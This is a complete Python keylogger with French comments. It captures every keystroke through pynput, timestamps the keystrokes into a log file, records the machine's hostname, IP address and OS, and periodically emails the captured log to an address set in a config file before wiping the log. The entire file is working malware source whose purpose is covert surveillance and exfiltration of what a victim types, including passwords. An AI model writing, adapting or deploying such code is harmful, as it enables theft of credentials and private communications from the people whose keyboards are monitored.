import threading
import configparser
import time
import smtplib
import os
import socket
from datetime import datetime
from pynput.keyboard import Key, Listener

# Charger le fichier conf.ini
config = configparser.ConfigParser()
config.read("conf.ini")

LOG_FILE = config["SETTINGS"]["log_file"]
EMAIL_SEND = config.getboolean("SETTINGS", "email_send")
EMAIL_INTERVAL = config.getint("SETTINGS", "email_interval")

SMTP_SERVER = config["EMAIL"]["smtp_server"]
SMTP_PORT = config.getint("EMAIL", "smtp_port")
SENDER_EMAIL = config["EMAIL"]["sender_email"]
PASSWORD = config["EMAIL"]["password"]
RECEIVER_EMAIL = config["EMAIL"]["receiver_email"]

# Obtenir des informations sur la machine
HOSTNAME = socket.gethostname()
IP_ADDRESS = socket.gethostbyname(HOSTNAME)
OS_INFO = os.name  # 'nt' pour Windows, 'posix' pour Linux/macOS

# Vérifier si le fichier log existe, sinon le créer avec en-tête
if not os.path.exists(LOG_FILE):
    with open(LOG_FILE, "w", encoding="utf-8") as log_file:
        log_file.write(f"Machine: {HOSTNAME}\nIP: {IP_ADDRESS}\nOS: {OS_INFO}\n----------------------\n")

last_logged_minute = None

def format_key(key):
    """ Convertit les touches spéciales et les chiffres en caractères lisibles. """
    if isinstance(key, Key):
        special_keys = {
            Key.space: " ",
            Key.enter: "\n",
            Key.tab: "[TAB]",
            Key.shift: "[SHIFT]",
            Key.ctrl_l: "[CTRL]",
            Key.alt_l: "[ALT]",
            Key.backspace: "[BACKSPACE]",
            Key.esc: "[ESC]",
            Key.caps_lock: "[CAPSLOCK]",
        }
        return special_keys.get(key, f"[{key.name.upper()}]")
    
    elif hasattr(key, 'char') and key.char is not None:  # Caractères normaux, incluant les chiffres
        return key.char
    
    elif hasattr(key, 'vk') and 96 <= key.vk <= 105:  # Vérifier si c'est un chiffre (Pavé numérique 0-9)
        return str(key.vk - 96)
    
    elif hasattr(key, 'vk') and 48 <= key.vk <= 57:  # Vérifier si c'est un chiffre (Touches normales 0-9)
        return str(key.vk - 48)
    
    return str(key)

def on_press(key):
    """ Capture les frappes et les enregistre dans le fichier log avec un format lisible. """
    global last_logged_minute
    try:
        current_time = datetime.now()
        current_minute = current_time.strftime("%H:%M")
        key_str = format_key(key)
        
        with open(LOG_FILE, "a", encoding="utf-8") as log_file:
            # Ajouter un timestamp si la minute a changé
            if last_logged_minute != current_minute:
                log_file.write(f"\n[{current_minute}] ")
                last_logged_minute = current_minute
            
            log_file.write(key_str)
    except Exception as e:
        print(f"Erreur d'écriture du log: {e}")

def send_logs():
    """ Envoie les logs par e-mail si activé dans conf.ini avec un meilleur format. """
    if EMAIL_SEND:
        try:
            with open(LOG_FILE, "r", encoding="utf-8") as file:
                logs = file.read()
            
            email_subject = f"[KeyLogger] Logs from {HOSTNAME} ({IP_ADDRESS}) - {OS_INFO}"
            email_body = (
                f"Machine: {HOSTNAME}\n"
                f"IP: {IP_ADDRESS}\n"
                f"OS: {OS_INFO}\n"
                f"----------------------\n"
                f"Captured Keystrokes:\n{logs}\n"
                f"----------------------\n"
            )

            server = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
            server.starttls()
            server.login(SENDER_EMAIL, PASSWORD)
            server.sendmail(SENDER_EMAIL, RECEIVER_EMAIL, f"Subject: {email_subject}\n\n{email_body}")
            server.quit()

            # Nettoyer les logs après envoi et réécrire l'en-tête
            with open(LOG_FILE, "w", encoding="utf-8") as log_file:
                log_file.write(f"Machine: {HOSTNAME}\nIP: {IP_ADDRESS}\nOS: {OS_INFO}\n----------------------\n")
        except Exception as e:
            print(f"Erreur d'envoi des logs: {e}")

def start_keylogger():
    """ Démarre l'écouteur de touches. """
    with Listener(on_press=on_press) as listener:
        listener.join()

# Lancer le keylogger en arrière-plan
keylogger_thread = threading.Thread(target=start_keylogger, daemon=True)
keylogger_thread.start()

# Envoi automatique des logs à intervalles définis
while True:
    send_logs()
    time.sleep(EMAIL_INTERVAL)
